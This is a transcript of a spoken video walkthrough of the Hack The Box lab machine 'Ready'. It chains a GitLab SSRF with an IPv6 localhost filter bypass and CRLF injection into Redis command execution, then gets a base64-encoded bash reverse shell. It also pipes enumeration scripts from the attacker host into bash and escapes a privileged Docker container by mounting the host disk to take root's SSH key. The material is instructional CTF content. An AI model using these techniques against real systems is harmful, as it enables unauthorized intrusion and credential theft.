 what's going on youtube this is ipsec i'm doing ready from hack to box which starts out with finding an old gitlab instance from 2018 and that is vulnerable to an authenticated rce but registrations open the public so it might as well be unauthenticated since anyone can just register an account the rce itself is really cool so instead of using an exploit script we're gonna step through it to analyze it because there's four main pieces to this exploit chain the first is it's a server-side request forgery meaning we can make the server make a request back to us and the only protocols available or are like http ssh and git you can't use the standard gopher to tunnel different protocols in however it is vulnerable to a crlf which is just inserting line breaks so you don't really need gopher we can use the get insert a few lines to access redis which is listing on localhost to execute commands and get a shell it's really cool and the piece i had missed off because i know i said four pieces only listed three the fourth one is bypassing a filter that prevents the ssrf from accessing ports on localhost by just specifying the ip address in a weird ipv6 way so that is four pieces to ssrf to get code execution it's a really cool attack once we get shell on the box the priv-esque is we're just running in a docker that has a sysadmin privilege i think it's a privileged container so we can just mount the disk and read files off the route with that being said let's jump in as always i'm going to start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it ready and then the ip address which is 10 10 10 220. this can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and it's spanner of 8.2 p1 ubuntu 4. tells me this is probably going to be ubuntu focal or ubuntu 20. i bet if we just google this so putting here open ssh and say launchpad we can go to the page where it's from um on ubuntu and let's see it is focal which i think is ubuntu 20. so we know that and then we also have http on port 5080 it's running engine x we have some nse scripts go off by nmap first the robots.txt giving us some entries in there and then we also have http title saying we can sign in to get lab so we know on port 5080 it's a gitlab instance so let's go over there so let's go 10 10 10 to 20 50 80 and eventually we should get to the sign in page and based upon registration being here looks like there's open registration so let's register for an account and the main reason we like registering for gitlab is because well there may be some open projects here and there could also be a way to enumerate versions so we'll just check some basic enumeration once we log in and let's see let's go to snippets i don't see any projects here if we go to groups explore groups i don't think we have anything i did snippets there's no snippets here nothing here if we go in the top right and click on setting not settings uh help we can see what version of git lab this is and it's 11.4.7 so i'm going to google get lab 1147. if we do release uh we have the patch release right here the other good thing to search is like gitlab 1147 change log or release notes or just things like that and you'll all get to the same page generally whenever a changelog happens they give you the version so you know how old it is this one is november 21st 2018 so this is a extremely old one we don't really have any exploits here if we go to uh the previous post get lab critical security release so 11 5 and they're releasing a major security thing and not too many details here if we google like get lab rce 2018 we get a lot of post and if we go here i mean we're just going to get autopilot scripts which isn't going to be fun so i'm going to search for git lab um maybe get lab i want to look at gitlab source and it worked uh we have that i just searched for git lab it doesn't so kudos to gouda coodles kudos to google for knowing gitlab gitlab means i want to search the gitlab website for the get lab repo and then we can click let's see up here and if we look we have a lot of commits and because this is going to be so old um it's going to be a pain to search so if i search for merge branch security i think that's how some of the things started and i'm going to do this and i'm going to use the power of video editing to scroll to around november 2018 so i'm just going to hold page down for probably a minute so here we are we can see november 2018 and a bunch of security issues the one that really sticks out is this one to me and that's because server side request forgeries are like amazing a lot of people kind of just find them report them and get it fixed because ssrf in itself is a bug however there are a lot of exploit chains with this that can make it a lot more dangerous so this one saying merge branch security 11.5 fix web hook ssrf ipv6 into security this is interesting because if we know how to do the ssrf we can potentially um find an exploit chain to take this to the next level so this is specifying ipv6 so if we look at this it's doing a validate local host so it's saying local ips 127.001 uh then double colon one and quad zeros so these are ways to specify like local hosts it's not all the ways as we saw like years ago i think in my holiday video we did a lot of different ways to encode ips as we do see here for instance like i think this is octo no case notation so if i like ping this zero one seven seven dot one like what do you think it's gonna go do you think it's gonna go to zero one seven seven dot one well yes because it's encoded 127.001 but it's just in a weird format the computers are magical you can specify tons of formats so here's another one that will go to localhost um let's see how about octets and hex so ping and then it's just knowing the zeros or like that like if i do 0.0 uh yep it's gonna do the same thing we can say 0x1 still goes here so there's a lot of cool ways you can specify ip addresses instead of doing like hex for each octa why not just one long hex address it works so this is doing a ssrf uh validating localhost so if we looked at cves we'd see there's like a ssrf vulnerability within gitlab but i'm just going to go over to projects go to new projects uh let's see create a project and then we're going to import and get repo by url so this is where the vulnerability lies if we try to do http 127 0 0 1 and we give this a name it's going to say uh import url is blocked localhost not allowed if we go to our self so 10 10 14 2 and then let's do nc lvmp 80. uh we gotta listen on sudo or usu to listen see it's just going to go there we create the project and the server connects back to us and we get this header so we get a lot of information here and this in itself isn't a vulnerability we made the server make a request so we can go download a file and do something with the file that's not a vulnerability that's using the application as it's intended the vulnerability lies is because the developer doesn't want you to access ports on localhost because those aren't exposed externally and there could be some sensitive protocols listing on localhost in gitlab's case it is redis which is a caching agent and if you access it there are some command lines you can send to get code execution based upon the protocol so we're looking at this and when we did that we had a bunch of junk here so we can't really put extra information here the main way people chain ssrfs into actual code execution is using gopher because you can just like craft packets on the wire or not craft like craft bytes on the wire it's a very minimal protocol meaning like i tell governor to connect and then i just put data here and i could craft this whole message so let's try gopher first so instead of http let's do gopher 10 10 14 2 port 80. we'll call this test two and we are listening right yep we create project and url is blocked we only allow http https ssh and get so if we do get on this we create the project uh let's see it's saying path can only contain letters digits so it doesn't like the colon in this project slug that's fine create the project path has already been taken let's do this will be get test create project and let's see should be doing git colon 10 10 14 280 and why did it not connect to me that is bizarre i wonder if i'd specify like a path because normally when you do git you specify a dot get file so let's do a new project real quick let's do test three we have to import project paper by url get test test.get so this is generally how you would use a git url if you're confused i mean if we just go to github and search for ipsec you can see i have a few projects so if we go like ipsec.github.io which is my like website ipsec.rocks all the source code there we can i thought it would be an ssh option weird i could swear there's used to be ssh now we got this github i don't know but if you do this and you see a ssh option uh let's do git lab get lab and ends in dot get i don't know what that command line client is for github that is i guess new so clone clone with ssh so get and then it ends with dot get on https oh it is ending with kit as well but let's try making that and in dot get long way to go for i don't know what just happened there but we'll get there so i am listening on 80 let's just double check yes i am and i'm doing 10 10 14 2 test.get create project there we go so we have it connecting back to me so if we want to actually craft stuff we have to be able to um send data if this was gopher we could just like do the hex for line break i think zero d zero a and then put stuff on a new line so let's kind of try that with this get see if there's that type of vulnerability here so we have to again go back import project reaper by url let's do test test.get sure test 4 and we'll call this test4 i guess and i'm going to send this one to burp suite so create project go to burp suite and we can see the get is right here it ends in test.get so i'm going to do please subscribe and then we're just going to for this packet and we see a please subscribe here so we can now make a connection back to ourselves and send lines so if we can connect to a port on the gitlab server we can then send lines afterwards so i'm going to search for git lab ssrf rce and of course let's take burp suite off and let's see well this one looks like it's going to be a like one and done script that we won't learn from but here we go we have this one post and it's talking about oh the specifying an ipv6 kind of like what we looked at with um the gitlab issue so let's go a new project and let's make sure we can hit localhost before we go down this path too far in order for this rce to work we have to be able to hit ports on localhost so i'm going to call this test5 but we have to import project get so we'll do get and then let's do look at my last ping let's try doing it with a hex address test test.get test 5 slug test 5 sure and we probably should specify the port there we go create project url is blocked request to localhost not allowed so on those get issues there were other ones like specifying it through ipv6 so we can try this so let's go to this tab and then specify this sure we can leave it at foo create project and it works so ipv6 works in importing the url i'm going to copy this to my clipboard so we can do it a bit quicker the next time and if we look at the post it's doing the same thing so that is the same exact thing we sent and it's going for rce by sending these lines multi s add l push and a few exacts so let's try that so projects new import reaper by url specify this and we want to specify what port it was what port is radius he's doing 6379 so go here the port goes after this okay we'll say rce1 we'll call it and we will have to intercept this packet so send it to burpsuite let's make sure my proxy is clean create project there we go and right here is where we want to insert code so let's go back and i can close out some of these tabs to make it a bit easier to switch back and forth so we want to send these lines yeah i don't know why he's ending exec three times but the first time doesn't work try and try try and try again so all i'm doing here is getting rid of that beginning space and what he's running is this setsid python and then temp nc.pi don't know what that is so what we can do is let's try ping so ping dash c 10 10 14 2 uh we need c space 1 10 10 14 2. okay so sudo tcp dump dash i ton zero dash n and we'll see if this works and i'm going to just copy this whole thing so if it doesn't we can quickly swap it out so forward and then we go back to the browser it is doing an import in progress so let's see if we have any pings we have one from 10 10 10 220 back to myself so uh it's paying multiple oh probably because we did the exact multiple times but we can see it looks like it is working more than i expected though did i specify oh i do not specify icmp so this was me hitting the page i was like why is it on port 5080 but yeah um we do have a ping but that is from 10 10 14 2. so we may have to send this again so let's do new project rce2 uh import project here by url let's do it doesn't really matter what the url is because i'm going to change it in burp suite i have everything on my clipboard so i just want to get something quick so now we can go to this url and then paste and we're back where we left um the reason why i didn't just send this to repeater is in case there's like an csrf token or something so let's see we did ping 10 10 14 2 read okay i'm just going to clear this and we will forward and see if we get anything and again this is just me going to the gateway so nothing special there i'm looking for a 220. uh name has been taken so test five oh that's been taken test six yeah testic sounds fine uh i don't know how that's gonna work i don't think it put line breaks there so let's just stop it foo make sure grip suite window is cleared out send it and let's see here's foo and here's the start let's get rid of that it's a url going here foo project test six okay i think this is fine i am pinging forward to intercept off import and progress so now it is connecting to redis hopefully and it may ping us if we did everything correctly and it doesn't look like it is so maybe ping isn't on this box or maybe we did something wrong it's more likely we did something wrong but it's always possible ping's not there this is potentially a docker instance so let's try something else so go back to here this is the painful part uh let's do http test test seven okay make sure my burp suite is intercepting create project and then let's see this url we can put our git instead of ping let's do who am i and maybe the binary nc is on the box so nc 10 10 14 2 port 80. sudo nc lvnp 80 send turn intercept off we're doing a who am i now i wonder if we don't want to begin with a pipe if that's the issue because it still is not connecting there we go we got a hit back but it's an old one um maybe i should try a different port when we do this the next time and i'm going to add the spaces if you remember when i was creating the payload uh let's do port 9001 i got rid of those like beginning spaces because i thought it was a clipboard thing maybe that's actually needed so let's go back to new import project repo by url that's still in my clipboard awesome so test uh let's do actually http test test nine i think it's getting ridiculous if i was doing this like on an engagement i would probably have used docker to build this instance and create a working payload uh locally first so i don't create a bunch of these projects but since this is just hack the box it's learning so we don't have to worry about that so what i want to do is put a space at the beginning of everything okay ping c1 let's try this sudo tcp dump dash i ton zero icmp i like dash n even though it's probably not needed ford turn intercept off it is importing and we still don't have anything so let's try one last thing before we go back to the drawing board so let's do go back to his blog post and we want to specify the url so this okay and we'll say rce to yep pip tweet intercept on new project and then right here that's where we put it in and i'm going to copy and paste in case something got screwed up between all my copy and pasting before i'm going to do it again and let's see we just want to nc so who am i then nc 10 10 14 2 port 80. okay that looks fine oh nope 9001 glad i caught that and still no hit backs i wonder if i end this with anything let's see how does he do it if we go here eval thank you he does have a space so i'll put a space there and then we will forward going here import in progress there we go i wonder if it was the space um let's see let's go back let's try the ping again and then i'm going to do a space and we'll see if that's it rce3 url because i'm kind of curious if ping is just not in the box because ping is like my go-to of this is always going to work so it not being there it is concerning to me so let's see rce3 rce3 intercept on create then we go where this get is go here scroll down for his payload and then we copy this once the spaces okay he does have a space there ping dashie one ten ten fourteen two and i have a space my tcp dump is still going forward it is importing and we don't get it something so it has nc but it doesn't have ping which is weird but that's fine now we have to find a way to get a reverse shell so because i already know i'm going to have like a painful time with what's on this box i'm just going to base64 encode this and also because like this is going in a parameter with quotes these are escaped quotes it's it's a pain so let's do echo dash n and then what is it bash c i'll put this in single quotes then bash dash i dev tcp 10 10 14 2 9 000 1 0 at and 1 like that that should be good then we want to base64 encode it so base64-w0 so we have this i wish that plus was not there because the plus is a weird character but oh well echo dash n basic 64-hd bash nc lvnp 9001 we get a connection okay so we have this and let's go and do this payload again see if it works if it doesn't i may try playing with the base64 to not do the plus because it could be a bad character it may not i don't know let's do rce4 we gotta import project url i've been having the most luck just copying everything instead of doing it all at once so rce4 rce4 prep suite on create project then a line break there scroll down copy paste like that i think it pasted weird but oh well and we want to put a one liner here so let's copy and paste right there echo dash n bash space so we'll see if this works and see lvnp9001 we are already listening oh no i forgot the l there we go so now if i for this to intercept off import is in progress and we'll see if we get anything does not look like we are so what i'm going to do is let's see do we have that somewhere was it in this pane let's go to cyber chef real quick let's see if i can get rid of that space cyber chef and if i can't get rid of the space we'll just switch payloads so let's go to cyber chef come on and it could also not have bash it's another potential like it not having um nc is throwing me off so let's see let's take this off let's see actually copy let's just put input there and go to base64. so just put extra space there that was easy so let's do an extra space here see equals is probably fine i'm going to live with an equals with trade getting rid of space for leaving the equals there so now we have something that doesn't have space and well a plus every time i say space i say plus and the reason why that's the bad character is plus and h like urls or post data could be translated to a space make sure my payload still works does not because i don't have let's see that is on me base64-d payload still works so let's try this before we throw out this idea of this type of payload so going back here we can import so let's see new project url and i think this box was like blooded in 15 minutes which is kind of impressive because as you see the exploit isn't super straightforward but maybe by the time the box was released the exploit had a script that we could just do but doing this manually is not the easiest thing as you see rce5 let's go burp suite so let's see lines i really should have this automated but if i was going to automate it might as well just pull one of those exploit scripts so let's see exec and we can put our payload here and i probably should have tested this before the video but for some reason you guys like watching me struggle in this type of troubleshooting so no idea if this is gonna work sudo ncl vmp i don't need it because um it's 9000 watts it's not a privileged port but have it anyways oh my god that was it this the plus wow uh that was like a long shot uh it's probably me doing something else wrong in that but if that actually was it and it converting it actually i think it is because um it's treating this whole thing as a url right and as we see here uh equals let's see equals is here i bet the space if we had looked at this it put a space here wow i'm actually really happy i went down that path learned something new so now we have a shell on the box so let's do python well first which ping ping is not on the box so that is why which nc we see it gives me the path so which python which python2 which python3 there we go python3 is on the box so import pty pty dot spawn then bash stty raw minus echo fg enter enter and then i can export term is equal to x term so i can clear the screen awesome now that we have a shell on the system the very first thing i like doing is just looking at like the ip address uh we can do ifconfig if ip doesn't exist and oh god both of these don't exist uh lsla on slash and we do see we are inside a docker environment so the very first script i probably want to run is called deepsea so i'm going to make dir dub dub dub i'm going to go and pull deepsea so deep c github and we can go to this script and this is just like a um docker script dockers like logo is a whale so that's where it gets the name deepsea and they provide a nice w get one liner just to download it here and since hack the box doesn't have internet that's why i'm downloading it to my machine so stand up a web server and we can curl 10 10 14 2 port 8000 deepsea.sh pipe it over to bash and we can see right off the bat it said it was exploitable so let's see what we have so exploit test exploitable check this out and positive another i don't know exactly what it's saying is explainable yes we're inside a container tools none users get container id we have ip address information 172.19 this is a default like docker ip range uh some useful tools that are installed curl w get nc hostname python3 capsh isn't installed so it doesn't tell us the dangerous capabilities we have sshd on port 22. so we could ssh into this docker maybe i don't know um we have docker sock mount and no other mounts uh we have this slash root underscore pass that's interesting and we can't read the shadow file so let's cat root pass is it going to be that easy cat etsy pass wd cat root pass there's a user called dude s u dash uh let's paste to see if we get n we don't s u dash dude see if we can get shell as him i'm going to grep for slash ben on etsy passwd to get all these users uh we can try i don't know why matamos is on the server su-matamurst paste the password and i don't know what this root pass thing is doing so i'm going to go over and we're going to try a different enumeration script so cp opt privilege escalation awesome script suite linps limpese.sh to dub dub dub and let's run lin p's so curl 10 10 14 2 8 000 linps.sh pipe it over to bash and let this run to see if this gives us anything else once we get to root maybe i'll try running deep c again to see if we get different things um generally in docker most escapes you want to be root on the container so a lot of people just give root to docker containers to begin with because who cares but i said who cares because docker is meant to be like isolated by default so if someone gets rude on the container i mean it's limited to the service they exploited so it doesn't really matter that much but if there's capabilities and stuff involved in docker being root is helpful because it's just like that uh we'll probably find out in a few minutes as we go through this output signature verification is this a virtual machine linp's is telling us yes rootless docker nope because we are the get user uh we have current capabilities uh ch own a bunch of things uh sys module the cis admin is a dangerous one uh p trace so we can potentially debug things uh well like p trace if we can debug a root process we may be able just to get it to execute code but looking at devices as well we see uh sda and this is probably the root disk so if we can just mount sda one two or three whichever one is root on the file system we can just get access to root that way however we can't root as the get user because that is a privileged command so we have to escalate to root on this container in order to mount those sda devices so now we're just looking at processes right now you can see this is like my reverse shell right now we're doing um the one liner then bash bash jesse python curling lynn p's and lin p's doing things so yeah um looking at process permissions nothing interesting there iptables uh we have more of this user dude all uses groups password policy nfs export we have this weird opt backup directory that contains like docker compose secrets and gitlab so we probably should look at the backup directory if we don't have anything so let's go cd opt back up daca compose and this looks like it is going to be the git lab file to build this container so ports uh we can see privileged equals true so this is why the sda block device was available in our docker and nothing too interesting there we have git lab rails initial route password root pass so it's setting the get lab password to be that root pass so that's what that file is if we look here we have get lab secrets uh that's internal key what's gitlab.rb well let's get rid of all the comments because comments don't really matter so starts with which is the carrot and then we escape the pound signed we want grab v and then grab period to grab for anything but just a line break and we have a smtp password so let's try this with the root so let's copy this paste and we are root on this container so let's curl 10 10 14 2 eight thousand deepsea.sh pipe it over to bash and uh curl was in some weird directory uh dev shm wget let's do 10 10 14 2 8 000 deepsea.sh and we can just execute this so let's see if capsh is now on this does this give us anything else so here we go um as root it allows us to enumerate the privileges pretty much the same things were highlighted as linp's the weird thing is this script required us to be root while lynn p's did not so maybe deep sea isn't a great script to run anymore because len p's was able to get this anyways but i don't know um let's now make the mount sda1 mount dev sda1 to mount sda1 uh let's do makeder sda2 and let's look at what's in sda2 looks like the root file system so let's go mount sda2 root and we can get root.text is there a dot ssh directory looks like there is uh idrsnidrsa.pub let's cat id rsa.pub and authorize keys and it looks like nv and v they end in the same thing so we should be able to copy this idrsa to a box and ssh into this to get root here so let's v uh root dot pam i guess i'll call it chmod 600 s h dash i on the file root at 10 10 10 220. we are now root on ready and we can get root.text so hope you guys enjoyed the box or the video take care and i will see you all next time